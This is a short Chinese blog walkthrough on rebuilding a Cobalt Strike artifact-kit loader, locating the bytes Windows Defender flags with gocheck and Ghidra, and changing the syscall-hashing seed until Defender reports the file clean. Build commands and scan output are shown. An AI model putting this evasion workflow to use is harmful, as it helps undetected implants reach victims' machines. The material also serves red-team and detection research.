---
title: artifact-kit
date: 2025-11-26
draft: false
tags:
hidden: false
comments: false
---




编译参数如下：
```
./build.sh pipe VirtualAlloc 310272 5 true true indirect ./build/
```

运行检查命令
```
PS C:\WS\arsenal-kit\kits\artifact\build\pipe> C:\ws\gocheck64.exe check .\artifact64big.exe -d
[*] Found Windows Defender at C:\Program Files\Windows Defender\MpCmdRun.exe
[*] Scanning .\artifact64big.exe, analysing 358400 bytes...
[*] Threat detected in the original file, beginning binary search...


[+] Windows Defender - 634.6443ms
[!] Isolated bad bytes at offset 0x13D5 in the original file [approximately 5077 / 358400 bytes]
00000000  31 d2 41 89 d0 42 80 3c  01 00 74 16 41 89 c1 46  |1.A..B.<..t.A..F|
00000010  0f b7 04 01 ff c2 41 c1  c9 08 45 01 c8 44 31 c0  |......A...E..D1.|

[*] Trojan:Win64/CobaltStrike.BL!MTB

[+] Total time elasped: 635.8383ms
```

打开 ghidra 选择 search -> memroy 在输入框中粘贴 `0f b7 04 01 ff c2 41 c1` 并点击搜索
![Image Description](/images/Pasted%20image%2020251018153247.png)

搜索结果如下图所示
![Image Description](/images/Pasted%20image%2020251018153345.png)

转到 artifact-kit 源码，搜索 `0x7385062b`，可以看到该值定义在 syscalls.h 文件中
![Image Description](/images/Pasted%20image%2020251018153443.png)

接着搜索名为 SW3_SEED 的常量
![Image Description](/images/Pasted%20image%2020251018153605.png)

接下来在 syscalls_indirect.c 中修改 SW3_HashSyscall 函数
![Image Description](/images/Pasted%20image%2020251018153948.png)

编译后再次检测，成功通过，结果如下图所示
```
PS C:\WS\arsenal-kit\kits\artifact\build\pipe> C:\ws\gocheck64.exe check .\artifact64big.exe -d
[*] Found Windows Defender at C:\Program Files\Windows Defender\MpCmdRun.exe
[*] Scanning .\artifact64big.exe, analysing 358400 bytes...
[*] File looks clean, no threat detected
[+] Total time elasped: 73.7783ms
```


```
./build.sh pipe HeapAlloc 644928 5 true true indirect_randomized ./build/
```